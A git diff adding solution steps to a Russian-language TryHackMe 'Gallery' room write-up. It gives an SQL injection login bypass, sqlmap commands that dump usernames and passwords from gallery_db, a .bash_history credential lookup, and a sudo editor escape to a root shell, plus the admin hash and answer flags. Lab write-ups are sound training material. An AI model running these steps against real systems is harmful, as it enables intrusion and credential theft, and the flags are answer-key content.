@@ -1,6 +1,6 @@
 [>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)
 
-# Комната [Gallery]() 
+# Комната [Gallery](https://tryhackme.com/r/room/gallery666) 
 
 Всего 2 задания:
 ## Задание 1
@@ -27,11 +27,21 @@ Simple Image Gallery
 Какой хеш-пароль у пользователя admin?
 ```commandline
 'or 1=1 -- -
+sudo sqlmap -r test.req --dbs
+sqlmap -r test.req --current-db gallery_db --tables
+sqlmap -r test.req --current-db gallery_db -T users --columns
+sqlmap -r test.req --current-db gallery_db -T users -C username,password --dump
 ```
 ```commandline
 a228b12a08b6527e7978cbe5d914531c
 ```
 Что такое флаг пользователя?
+```commandline
+searchsploit Simple Image Gallery
+cat .bash_history
+su mike
+cat user.txt
+```
 ```commandline
 THM{af05cd30bfed67849befd546ef}
 ```
@@ -40,6 +50,15 @@ THM{af05cd30bfed67849befd546ef}
 Удачи на последнем этапе!
 ### Ответьте на вопросы ниже
 Что такое корневой флаг?
+```commandline
+sudo -l
+cat /opt/rootkit.sh
+sudo /bin/bash /opt/rootkit.sh
+^R^X
+reset; sh 1>&0 2>&0
+id
+cat /root/root.txt
+```
 ```commandline
 THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}
 ```
